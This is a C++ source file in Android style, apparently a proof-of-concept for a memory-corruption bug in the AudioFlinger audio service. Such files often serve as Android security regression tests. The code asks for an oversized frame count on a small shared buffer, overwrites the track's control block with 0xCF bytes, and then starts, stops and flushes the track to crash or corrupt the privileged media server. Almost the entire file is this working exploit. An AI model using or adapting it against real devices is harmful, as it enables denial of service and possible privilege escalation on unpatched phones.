/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <binder/IServiceManager.h>
#include <binder/MemoryBase.h>
#include <binder/MemoryDealer.h>
#include <binder/MemoryHeapBase.h>
#include <binder/Parcel.h>
#include <media/AudioSystem.h>
#include <media/AudioTrack.h>
#include <media/IAudioFlinger.h>
#include <media/stagefright/AudioSource.h>
#include <private/media/AudioTrackShared.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <system/audio.h>

#include <cutils/log.h>
#define LOG_TAG "c0reteam"
#define LOG_NDEBUG 0

using namespace android;

int main(int argc, char **argv) {
  const sp<IAudioFlinger> &audioFlinger = AudioSystem::get_audio_flinger();
  if (audioFlinger == 0) {
    return NO_INIT;
  }

  status_t status;

  audio_stream_type_t streamType = AUDIO_STREAM_MUSIC;
  audio_io_handle_t output;
  audio_session_t sessionId = (audio_session_t)0;
  audio_session_t mSessionId = sessionId;
  int mClientUid = getuid();
  int mClientPid = getpid();
  int mSampleRate = 44100;
  audio_format_t mFormat = AUDIO_FORMAT_PCM_16_BIT;
  int numChannels = 2;
  audio_attributes_t *attr = NULL;

  audio_channel_mask_t mChannelMask =
      audio_channel_out_mask_from_count(numChannels);
  audio_output_flags_t mFlags = AUDIO_OUTPUT_FLAG_NONE;
  audio_port_handle_t mSelectedDeviceId = AUDIO_PORT_HANDLE_NONE;
  audio_offload_info_t *mOffloadInfo = NULL;

  status = AudioSystem::getOutputForAttr(
      attr, &output, mSessionId, &streamType, mClientUid, mSampleRate, mFormat,
      mChannelMask, mFlags, mSelectedDeviceId, mOffloadInfo);

  audio_output_flags_t flags = mFlags;
  size_t mReqFrameCount = 1000000;
  size_t frameCount = mReqFrameCount;
  size_t temp = frameCount;
  pid_t tid = -1;
  sp<MemoryDealer> dealer = new MemoryDealer(512);
  sp<IMemory> mSharedBuffer = dealer->allocate(512);
  void *psharedbuffer = mSharedBuffer->pointer();
  memset(psharedbuffer, 0xCF, 512);

  sp<IAudioTrack> track = audioFlinger->createTrack(
      streamType, mSampleRate, mFormat, mChannelMask, &temp, &flags,
      mSharedBuffer, output, mClientPid, tid, &mSessionId, mClientUid, &status);

  sp<IMemory> cblk = track->getCblk();
  if (cblk == NULL) {
    return -1;
  }

  void *pcblk = cblk->pointer();
  memset(pcblk, 0xCF, sizeof(audio_track_cblk_t));
  memset(psharedbuffer, 0xCF, 512);

  track->start();
  track->stop();
  track->flush();

  return status;
}
